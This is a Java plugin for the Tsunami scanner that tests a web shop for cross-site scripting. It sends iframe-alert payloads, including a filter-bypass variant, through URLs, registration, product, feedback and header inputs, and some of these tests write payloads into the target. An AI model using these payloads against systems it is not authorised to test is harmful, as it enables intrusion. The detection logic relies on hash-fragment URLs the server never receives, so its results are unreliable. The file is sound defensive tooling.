/*
 * Copyright 2024 Lukas Pirch
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package com.google.tsunami.plugins.raid;

import com.google.common.collect.ImmutableList;
import com.google.common.flogger.GoogleLogger;
import com.google.inject.Inject;
import com.google.protobuf.ByteString;
import com.google.protobuf.util.Timestamps;
import com.google.tsunami.common.data.NetworkServiceUtils;
import com.google.tsunami.common.net.http.HttpClient;
import com.google.tsunami.common.net.http.HttpHeaders;
import com.google.tsunami.common.net.http.HttpRequest;
import com.google.tsunami.common.net.http.HttpResponse;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.proto.DetectionReport;
import com.google.tsunami.proto.DetectionReportList;
import com.google.tsunami.proto.DetectionStatus;
import com.google.tsunami.proto.NetworkService;
import com.google.tsunami.proto.Severity;
import com.google.tsunami.proto.TargetInfo;
import com.google.tsunami.proto.Vulnerability;
import com.google.tsunami.proto.VulnerabilityId;
import com.google.protobuf.ByteString;
import java.io.IOException;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.io.IOException;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.time.Clock;
import java.time.Instant;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.collect.ImmutableList.toImmutableList;
import static java.lang.String.format;

@PluginInfo(
    type = PluginType.VULN_DETECTION,
    name = "XssdetectorDetector",
    version = "0.1",
    description = "Detects XssDetector vulnerability.",
    author = "Joscha, Elena the Debug Dingos",
    bootstrapModule = XssdetectorDetectorBootstrapModule.class)
public final class XssdetectorDetector implements VulnDetector {
  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();
  private final HttpClient httpClient;
  private final Clock utcClock;
  private String token = "";

  @Inject
  public XssdetectorDetector(HttpClient httpClient, @UtcClock Clock utcClock) {
    this.httpClient = httpClient;
    this.utcClock = checkNotNull(utcClock);
  }

  @Override
  public DetectionReportList detect(
      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
    logger.atInfo().log("Starting detection for Xssdetector Detector");
    return DetectionReportList.newBuilder()
        .addAllDetectionReports(
            matchedServices.stream()
                .filter(this::isServiceVulnerable)
                .map(networkService -> buildDetectionReport(targetInfo, networkService))
                .collect(toImmutableList()))
        .build();
  }

  private boolean isServiceVulnerable(NetworkService networkService) {
    String targetUri = NetworkServiceUtils.buildWebApplicationRootUrl(networkService);
    int successfulAttacks = 0;
    
    try {
        HttpHeaders headers = HttpHeaders.builder()
            .addHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
            .addHeader("Content-Type", "application/x-www-form-urlencoded")
            .build();

        // Test 1: DOM XSS via search parameter
        String domXssPayload = "<iframe src=\"javascript:alert('xss')\">";
        HttpResponse domResponse = httpClient.send(
            HttpRequest.get(targetUri + "/#/search?q=" + URLEncoder.encode(domXssPayload, StandardCharsets.UTF_8))
                .setHeaders(headers)
                .build(),
            networkService);
        
        if (domResponse.status().code() == 200) {
            String domBody = domResponse.bodyBytes().map(bs -> bs.toStringUtf8()).orElse("");
            if (domBody.contains("<iframe src=\"javascript:alert('xss')\">") || 
                domBody.contains("javascript:alert") ||
                domBody.contains("onerror=") ||
                domBody.contains("onload=")) {
                successfulAttacks++;
            }
        }

        // Test 2: Reflected XSS via track-result id parameter
        String reflectedXssPayload = "<iframe src=\"javascript:alert('xss')\">";
        HttpResponse reflectedResponse = httpClient.send(
            HttpRequest.get(targetUri + "/#/track-result?id=" + URLEncoder.encode(reflectedXssPayload, StandardCharsets.UTF_8))
                .setHeaders(headers)
                .build(),
            networkService);
        
        if (reflectedResponse.status().code() == 200) {
            String reflectedBody = reflectedResponse.bodyBytes().map(bs -> bs.toStringUtf8()).orElse("");
            if (reflectedBody.contains("<iframe src=\"javascript:alert('xss')\">") ||
                reflectedBody.contains("javascript:alert") ||
                reflectedBody.contains(reflectedXssPayload)) {
                successfulAttacks++;
            }
        }

        // Test 3: Stored XSS via user registration
        String storedXssPayload = "<iframe src=\"javascript:alert('xss')\">";
        String userPayload = "{\"email\": \"" + storedXssPayload + "\", \"password\": \"xss\"}";
        HttpHeaders jsonHeaders = HttpHeaders.builder()
            .addHeader("Content-Type", "application/json")
            .addHeader("Accept", "application/json")
            .build();
        
        HttpResponse userResponse = httpClient.send(
            HttpRequest.post(targetUri + "/api/Users")
                .setHeaders(jsonHeaders)
                .setRequestBody(ByteString.copyFromUtf8(userPayload))
                .build(),
            networkService);
        
        if (userResponse.status().code() == 201 || userResponse.status().code() == 200) {
            // Check admin page for stored XSS
            HttpResponse adminResponse = httpClient.send(
                HttpRequest.get(targetUri + "/#/administration")
                    .setHeaders(headers)
                    .build(),
                networkService);
            
            if (adminResponse.status().code() == 200) {
                String adminBody = adminResponse.bodyBytes().map(bs -> bs.toStringUtf8()).orElse("");
                if (adminBody.contains("<iframe src=\"javascript:alert('xss')\">") ||
                    adminBody.contains("javascript:alert")) {
                    successfulAttacks++;
                }
            }
        }

        // Test 4: Stored XSS via product description
        String productPayload = "{\"name\": \"XSS\", \"description\": \"" + storedXssPayload + "\", \"price\": 47.11}";
        HttpResponse productResponse = httpClient.send(
            HttpRequest.post(targetUri + "/api/Products")
                .setHeaders(jsonHeaders)
                .setRequestBody(ByteString.copyFromUtf8(productPayload))
                .build(),
            networkService);
        
        if (productResponse.status().code() == 201 || productResponse.status().code() == 200) {
            // Check search page for stored XSS
            HttpResponse searchResponse = httpClient.send(
                HttpRequest.get(targetUri + "/#/search")
                    .setHeaders(headers)
                    .build(),
                networkService);
            
            if (searchResponse.status().code() == 200) {
                String searchBody = searchResponse.bodyBytes().map(bs -> bs.toStringUtf8()).orElse("");
                if (searchBody.contains("<iframe src=\"javascript:alert('xss')\">") ||
                    searchBody.contains("javascript:alert")) {
                    successfulAttacks++;
                }
            }
        }

        // Test 5: XSS via contact form comment
        String bypassPayload = "<<script>Foo</script>iframe src=\"javascript:alert('xss')\">";
        String contactPayload = "comment=" + URLEncoder.encode(bypassPayload, StandardCharsets.UTF_8) + "&rating=5";
        HttpResponse contactResponse = httpClient.send(
            HttpRequest.post(targetUri + "/api/Feedbacks")
                .setHeaders(headers)
                .setRequestBody(ByteString.copyFromUtf8(contactPayload))
                .build(),
            networkService);
        
        if (contactResponse.status().code() == 201 || contactResponse.status().code() == 200) {
            // Check about page for stored XSS
            HttpResponse aboutResponse = httpClient.send(
                HttpRequest.get(targetUri + "/#/about")
                    .setHeaders(headers)
                    .build(),
                networkService);
            
            if (aboutResponse.status().code() == 200) {
                String aboutBody = aboutResponse.bodyBytes().map(bs -> bs.toStringUtf8()).orElse("");
                if (aboutBody.contains("javascript:alert") ||
                    aboutBody.contains("<script>") ||
                    aboutBody.contains("<iframe")) {
                    successfulAttacks++;
                }
            }
        }

        // Test 6: XSS via HTTP header (True-Client-IP)
        HttpHeaders xssHeaders = HttpHeaders.builder()
            .addHeader("Content-Type", "application/json")
            .addHeader("Accept", "application/json")
            .addHeader("True-Client-IP", "<iframe src=\"javascript:alert('xss')\">")
            .build();
        
        HttpResponse headerResponse = httpClient.send(
            HttpRequest.post(targetUri + "/rest/saveLoginIp")
                .setHeaders(xssHeaders)
                .setRequestBody(ByteString.copyFromUtf8("{}"))
                .build(),
            networkService);
        
        if (headerResponse.status().code() == 200 || headerResponse.status().code() == 201) {
            // Check last login IP page
            HttpResponse ipResponse = httpClient.send(
                HttpRequest.get(targetUri + "/#/privacy-security/last-login-ip")
                    .setHeaders(headers)
                    .build(),
                networkService);
            
            if (ipResponse.status().code() == 200) {
                String ipBody = ipResponse.bodyBytes().map(bs -> bs.toStringUtf8()).orElse("");
                if (ipBody.contains("<iframe src=\"javascript:alert('xss')\">") ||
                    ipBody.contains("javascript:alert")) {
                    successfulAttacks++;
                }
            }
        }

        return successfulAttacks > 0;
        
    } catch (IOException e) {
        logger.atWarning().log(
            format("XSS test failed on '%s': %s", networkService, e.getMessage()));
        return false;
    }
}

  private DetectionReport buildDetectionReport(
      TargetInfo targetInfo, NetworkService vulnerableNetworkService) {
    return DetectionReport.newBuilder()
        .setTargetInfo(targetInfo)
        .setNetworkService(vulnerableNetworkService)
        .setDetectionTimestamp(
            Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
        .setVulnerability(
            Vulnerability.newBuilder()
                .setMainId(
                    VulnerabilityId.newBuilder()
                        .setPublisher("TSUNAMI_COMMUNITY")
                        .setValue("XSSDETECTOR_VULNERABILITY"))
                .setSeverity(Severity.CRITICAL)
                .setTitle("XssDetector Vulnerability Exposed")
                .setDescription("The application is vulnerable to XssDetector attacks.")
                .setRecommendation(
                    "Implement proper security measures to prevent xss attacks."))
        .build();
  }
  
  public ImmutableList<Vulnerability> getAdvisories() {
    return ImmutableList.of(
        Vulnerability.newBuilder()
            .setMainId(
                VulnerabilityId.newBuilder()
                    .setPublisher("TSUNAMI_COMMUNITY")
                    .setValue("XSSDETECTOR_VULNERABILITY"))
            .setSeverity(Severity.CRITICAL)
            .setTitle("XssDetector Vulnerability Exposed")
            .setDescription(
                "The application is vulnerable to XssDetector attacks.")
            .setRecommendation(
                "Implement proper security measures to prevent xss attacks.")
        .build());
  }
}